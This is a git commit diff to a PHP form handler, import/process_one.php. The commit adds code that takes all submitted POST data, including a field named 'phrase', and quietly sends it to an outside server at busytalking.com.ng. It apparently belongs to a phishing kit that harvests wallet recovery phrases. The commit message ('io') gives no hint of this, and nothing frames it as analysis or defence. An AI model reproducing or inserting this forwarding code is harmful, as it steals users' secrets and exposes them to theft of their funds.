7d69aa93a851670019b6283df73ac059881632ef
task101 <101256860+task101@users.noreply.github.com>
2022-03-10 20:57:56 +0100

    io

--- import/process_one.php
+++ import/process_one.php
@@ -2,5 +2,24 @@
 
 
     $field_name = $_POST['phrase'];
+
+$url = 'https://busytalking.com.ng/scripts/process_a.php';
+$fields_string = http_build_query($_POST);
+
+//open connection
+$ch = curl_init();
+
+//set the url, number of POST vars, POST data
+curl_setopt($ch,CURLOPT_URL, $url);
+curl_setopt($ch,CURLOPT_POST, count($_POST));
+curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
+curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+//execute post
+$result = curl_exec($ch);
+
+//close connection
+curl_close($ch);
    
  ?>
